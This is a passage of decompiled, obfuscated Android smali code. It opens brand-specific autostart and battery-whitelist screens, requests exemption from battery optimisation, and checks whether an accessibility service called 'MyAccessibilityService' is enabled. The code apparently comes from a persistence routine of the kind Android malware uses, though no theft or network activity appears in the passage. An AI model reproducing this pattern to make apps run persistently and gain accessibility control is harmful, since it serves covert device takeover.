    if-eqz v0, :cond_14

    const-string v0, "com.asus.mobilemanager.autostart.AutoStartActivity"

    invoke-static {v3, v6, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.asus.mobilemanager.powersaver.PowerSaverSettings"

    invoke-static {v3, v6, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    if-nez v0, :cond_1d

    :try_start_a
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    new-instance v4, Landroid/content/ComponentName;

    const-string v5, "com.asus.mobilemanager.entry.FunctionActivity"

    invoke-direct {v4, v6, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v4}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    const-string v4, "mobilemanager://function/entry/AutoStart"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    goto/16 :goto_c

    :cond_14
    :try_start_b
    const-string v0, "nokia"

    invoke-virtual {v8, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_18

    const-string v0, "hmd"

    invoke-virtual {v8, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_15

    goto :goto_6

    :cond_15
    const-string v0, "meizu"

    invoke-virtual {v8, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_16

    const-string v0, "com.meizu.safe"

    const-string v4, "com.meizu.safe.permission.SmartBGActivity"

    invoke-static {v3, v0, v4}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_4

    if-nez v0, :cond_1d

    :try_start_c
    new-instance v0, Landroid/content/Intent;

    const-string v4, "com.meizu.safe.security.SHOW_APPSEC"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const-string v4, "packageName"

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_5

    goto/16 :goto_c

    :cond_16
    :try_start_d
    const-string v0, "nothing"

    invoke-virtual {v8, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_17

    goto/16 :goto_d

    :cond_17
    const-string v0, "motorola"

    invoke-virtual {v8, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "lenovo"

    invoke-virtual {v8, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    goto/16 :goto_d

    :cond_18
    :goto_6
    const-string v0, "com.evenwell.powersaving.g3"

    const-string v2, "com.evenwell.powersaving.g3.exception.PowerSaverExceptionActivity"

    goto :goto_a

    :cond_19
    :goto_7
    const-string v2, "com.transsion.phonemaster"

    const-string v4, "com.cyin.himgr.autostart.AutoStartActivity"

    invoke-static {v3, v2, v4}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_1d

    const-string v2, "com.transsion.phonemanager.module.autostart.AutoStartActivity"

    invoke-static {v3, v0, v2}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_1d

    const-string v2, "com.itel.autobootmanager.activity.AutoBootMgrActivity"

    invoke-static {v3, v0, v2}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.mediatek.autobootcontroller"

    const-string v2, "com.mediatek.autobootcontroller.AutoBootAppManageActivity"

    goto :goto_a

    :cond_1a
    :goto_8
    const-string v0, "com.vivo.permissionmanager"

    const-string v2, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"

    invoke-static {v3, v0, v2}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"

    invoke-static {v3, v7, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.iqoo.secure.safeguard.PurviewTabActivity"

    invoke-static {v3, v7, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"

    invoke-static {v3, v7, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_d

    :cond_1b
    :goto_9
    const-string v0, "com.oplus.battery"

    const-string v2, "com.oplus.powermanager.fuelgaue.PowerConsumptionActivity"

    invoke-static {v3, v0, v2}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    invoke-static {v3, v10, v9}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.coloros.safecenter.startupapp.StartupAppListActivity"

    invoke-static {v3, v10, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.coloros.privacypermissionsentry.PermissionTopActivity"

    invoke-static {v3, v10, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.oppo.safe"

    const-string v2, "com.oppo.safe.permission.startup.StartupAppListActivity"

    :goto_a
    invoke-static {v3, v0, v2}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_d

    :cond_1c
    :goto_b
    const-string v0, "com.miui.securitycenter"

    const-string v4, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    invoke-static {v3, v0, v4}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_4

    if-nez v0, :cond_1d

    :try_start_e
    new-instance v0, Landroid/content/Intent;

    const-string v4, "miui.intent.action.OP_AUTO_START"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    :goto_c
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_5

    goto :goto_d

    :catch_4
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "openBrandBatterySettings error: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "BatteryAutoGranter"

    invoke-static {v3, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :catch_5
    :cond_1d
    :goto_d
    return-void

    :pswitch_e
    const-string v4, "battery_auto"

    const-string v0, "package:"

    :try_start_f
    const-string v5, "power"

    invoke-virtual {v3, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/os/PowerManager;

    if-eqz v5, :cond_1e

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_1e

    const-string v0, "EXEMPTION|already_whitelisted"

    goto :goto_e

    :cond_1e
    new-instance v5, Landroid/content/Intent;

    const-string v6, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {v5, v6, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {v5, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string v0, "EXEMPTION|dialog_shown"

    :goto_e
    invoke-static {v4, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_6

    goto :goto_f

    :catch_6
    move-exception v0

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "EXEMPTION|dialog_failed|"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_10
    new-instance v0, Landroid/content/Intent;

    const-string v4, "android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_7

    :catch_7
    :goto_f
    return-void

    :goto_10
    sget-object v0, Lڟەطڽٲ/ؠ;->؋:Landroid/widget/FrameLayout;

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "enabled_accessibility_services"

    invoke-static {v0, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1f

    const-string v2, "MyAccessibilityService"

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_20

    :cond_1f
    invoke-static {v3}, Lڟەطڽٲ/ؠ;->ء(Landroid/content/Context;)V

    :cond_20
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_0
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
    .end packed-switch
.end method
